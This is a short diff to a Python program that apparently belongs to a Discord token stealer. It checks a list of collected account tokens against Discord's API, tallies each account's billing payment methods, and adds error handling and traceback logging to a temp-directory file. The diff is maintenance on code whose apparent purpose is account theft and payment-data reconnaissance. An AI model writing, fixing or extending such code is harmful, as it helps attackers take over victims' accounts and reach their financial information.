@@ -625,7 +625,7 @@ class Discord:
 
         for token in tokens:
                 token = token.strip()
-                r = Discord.http.request('GET', 'https://discord.com/api/v9/users/@me', headers=Discord.getHeaders(token))
+                r = Discord.http.request('GET', 'https://discord.com/api/v9/users/@me', headers= Discord.getHeaders(token))
                 if r.status!=200:
                     continue
                 r = json.loads(r.data.decode())
@@ -656,6 +656,8 @@ class Discord:
                         'Unknown' : 0
                     }
                     for m in billing:
+                        if not isinstance(m, dict):
+                            continue
                         method_type = m.get('type', 0)
                         if method_type == 0:
                             methods['Unknown'] += 1
@@ -1174,4 +1176,5 @@ if __name__ == '__main__':
 
     except Exception as e:
         with open(os.path.join(os.getenv('temp', 'syslogs.log')), 'w') as file:
-            file.write(e)
+            trb = traceback.format_exc()
+            file.write(trb)
